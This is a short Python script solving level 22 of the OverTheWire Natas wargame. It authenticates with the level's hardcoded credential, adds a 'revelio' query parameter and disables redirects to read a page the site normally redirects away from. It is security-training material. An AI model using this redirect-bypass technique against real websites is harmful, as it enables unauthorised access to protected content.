# Name: Michael Krakovsky
# Date: April 26, 2019
# Description: Create a script to break the code on natas22.
# Version: 1.0

from requests import Session
from pyperclip import copy

username = "natas22"
passwd = "chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ"
url = "http://natas22.natas.labs.overthewire.org/?revelio=1"      # This is how we turn on the debug variables.

session = Session()

getResponse = session.get(url, auth=(username, passwd), 
                        allow_redirects=False)   # Let us deflect the redirect to ensure we stay on the main page
print(getResponse.text)
print(50 * '-')
copy(getResponse.text)